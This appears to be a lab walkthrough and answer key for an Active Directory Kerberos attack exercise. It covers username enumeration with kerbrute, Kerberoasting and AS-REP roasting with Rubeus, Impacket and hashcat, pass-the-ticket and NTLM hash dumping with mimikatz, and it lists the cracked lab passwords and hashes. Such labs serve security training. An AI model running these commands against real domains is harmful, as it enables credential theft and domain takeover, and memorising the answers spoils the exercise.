Common Terminology -  

- **Ticket Granting Ticket (TGT)** - A ticket-granting ticket is an authentication ticket used to request service tickets from the TGS for specific resources from the domain.
- **Key Distribution Center (KDC)** - The Key Distribution Center is a service for issuing TGTs and service tickets that consist of the Authentication Service and the Ticket Granting Service.
- **Authentication Serv****ice (AS)** - The Authentication Service issues TGTs to be used by the TGS in the domain to request access to other machines and service tickets.
- **Ticket Granting Service (TGS)** - The Ticket Granting Service takes the TGT and returns a ticket to a machine on the domain.  
    
- **Service Principal Name (SPN)** - A Service Principal Name is an identifier given to a service instance to associate a service instance with a domain service account. Windows requires that services have a domain service account which is why a service needs an SPN set.
- **KDC Long Term Secret Key (KDC LT Key)** - The KDC key is based on the KRBTGT service account. It is used to encrypt the TGT and sign the PAC.
- **Client Long Term Secret Key (Client LT Key)** - The client key is based on the computer or service account. It is used to check the encrypted timestamp and encrypt the session key.
- **Service Long Term Secret Key (Service LT Key)** - The service key is based on the service account. It is used to encrypt the service portion of the service ticket and sign the PAC.
- **Session Key** - Issued by the KDC when a TGT is issued. The user will provide the session key to the KDC along with the TGT when requesting a service ticket.
- **Privilege Attribute Certificate (PAC)** - The PAC holds all of the user's relevant information, it is sent along with the TGT to the KDC to be signed by the Target LT Key and the KDC LT Key in order to validate the user.

Often .kirbi for Rubeus, .ccache for Impacket

Answer the questions below

What does TGT stand for?
Answer: `Ticket granting ticket`

What does SPN stand for?
Answer: `Service Principal Name`

What does PAC stand for?
Answer: `Privilege Attribute Certificate`

What two services make up the KDC?
Answer: `AS, TGS`

# Task 2 Enumeration w/ Kerbrute

You need to add the DNS domain name along with the machine IP to /etc/hosts inside of your attacker machine or these attacks will not work for you - `10.10.173.199  CONTROLLER.local`

`./kerbrute userenum --dc controller.local -d controller.local User.txt`

```
  / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 11/17/23 - Ronnie Flathers @ropnop

2023/11/17 03:42:01 >  Using KDC(s):
2023/11/17 03:42:01 >   controller.local:88

2023/11/17 03:42:01 >  [+] VALID USERNAME:       administrator@controller.local
2023/11/17 03:42:01 >  [+] VALID USERNAME:       admin1@controller.local
2023/11/17 03:42:01 >  [+] VALID USERNAME:       admin2@controller.local
2023/11/17 03:42:04 >  [+] VALID USERNAME:       httpservice@controller.local
2023/11/17 03:42:04 >  [+] VALID USERNAME:       machine1@controller.local
2023/11/17 03:42:04 >  [+] VALID USERNAME:       machine2@controller.local
2023/11/17 03:42:04 >  [+] VALID USERNAME:       sqlservice@controller.local
2023/11/17 03:42:04 >  [+] VALID USERNAME:       user1@controller.local
2023/11/17 03:42:04 >  [+] VALID USERNAME:       user2@controller.local
2023/11/17 03:42:04 >  [+] VALID USERNAME:       user3@controller.local
2023/11/17 03:42:04 >  Done! Tested 100 usernames (10 valid) in 2.862 seconds
```


Answer: `10`

What is the SQL service account name?
Answer: `sqlservice`

What is the second "machine" account name?
Answer: `machine2`

What is the third "user" account name?
Answer: `user3`

# Task 3 Harvesting & Brute-Forcing Tickets w/ Rubeus



Which domain admin do we get a ticket for when harvesting tickets?
`rubeus.exe harvest /interval:30`
Answer: `administrator`

Which domain controller do we get a ticket for when harvesting tickets?
open `c:\windows\system32\drivers\etc\hosts` and add the ip and the name controller.local
`rubeus.exe brute /password:Password1 /noticket`

Answer: `controller-1`

# Task 4 Kerberoasting w/ Rubeus & Impacket


What is the HTTPService Password?

`rubeus.exe kerberoast`
Put the results into `hash.txt`, tidy them up, so its 2 lines starting with `$krb`
`hashcat -a 0 -m 13100 hash.txt Pass.txt`

Answer: `Summer2020`

What is the SQLService Password?

`python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.232.105 -request`
and Hashcat as above

Answer: `MyPassword123#`

# Task 5 AS-REP Roasting w/ Rubeus


`rubeus.exe asreproast`

Modify the hashes to read 
```
$krb5asrep$23$Admin2@CONTROLLER.local:<snip>
$krb5asrep$23$User3@CONTROLLER.local:<snip>
```

`hashcat -a 0 -m 18200 hash.txt Pass.txt`

What hash type does AS-REP Roasting use?
Answer: `Kerberos 5, etype 23, AS-REP`

Which User is vulnerable to AS-REP Roasting?
Answer: `user3`

What is the User's Password?
Answer: `Password3`

Which Admin is vulnerable to AS-REP Roasting?
Answer: `Admin2`

What is the Admin's Password?
Answer: `P@$$W0rd2`


# Task 6 Pass the Ticket w/ mimikatz

`mimikatz.exe`
`privilege::debug` returns `[output '20' OK]`
`sekurlsa::tickets /export` to dump the tickets

Look at the tickets in the folder and find a ticket you wish to use.

`kerberos::ptt [0;52094]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi`
Exit mimikatz and verify we have the ticket by running
`klist`


# Task 7 Golden/Silver Ticket Attacks w/ mimikatz


What is the SQLService NTLM Hash?

```mimikatz
privilege::debug
lsadump::lsa /inject /name:sqlservice
```

Answer: `cd40c9ed96265531b21fc5b1dafcfb0a`


What is the Administrator NTLM Hash?

```mimikatz
privilege::debug
lsadump::lsa /inject /name:administrator
```

Answer: `2777b7fec870e04dda00cd7260f7bee6`

